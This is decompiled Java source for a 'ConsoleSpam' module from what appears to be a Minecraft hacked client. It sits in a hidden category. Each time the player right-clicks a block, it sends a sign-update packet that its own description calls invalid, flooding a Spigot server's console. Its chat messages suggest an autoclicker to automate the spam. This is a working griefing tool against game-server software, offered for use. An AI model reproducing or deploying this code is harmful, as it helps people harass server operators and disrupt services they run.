//Deobfuscated with https://github.com/SimplyProgrammer/Minecraft-Deobfuscator3000 using mappings "/Users/imac/Downloads/Minecraft-Deobfuscator3000-master/1.12 stable mappings"!

//Decompiled by Procyon!

package me.zeroeightsix.kami.module.modules.misc;

import me.zeroeightsix.kami.module.*;
import me.zeroeightsix.kami.event.events.*;
import me.zero.alpine.listener.*;
import java.util.function.*;
import me.zeroeightsix.kami.command.*;
import me.zeroeightsix.kami.util.*;
import net.minecraft.tileentity.*;
import net.minecraft.network.play.client.*;
import net.minecraft.network.*;
import net.minecraft.util.math.*;

@Info(name = "ConsoleSpam", description = "Spams Spigot consoles by sending invalid UpdateSign packets", category = Category.HIDDEN)
public class ConsoleSpam extends Module
{
    @EventHandler
    public Listener<PacketEvent.Send> sendListener;
    
    public ConsoleSpam() {
        this.sendListener = (Listener<PacketEvent.Send>)new Listener(event -> {
            if (event.getPacket() instanceof CPacketPlayerTryUseItemOnBlock) {
                final BlockPos location = ((CPacketPlayerTryUseItemOnBlock)event.getPacket()).getPos();
                Wrapper.getPlayer().connection.sendPacket((Packet)new CPacketUpdateSign(location, new TileEntitySign().signText));
            }
        }, new Predicate[0]);
    }
    
    public void onEnable() {
        Command.sendChatMessage(this.getChatName() + " Every time you right click a sign, a warning will appear in console.");
        Command.sendChatMessage(this.getChatName() + " Use an autoclicker to automate this process.");
    }
}
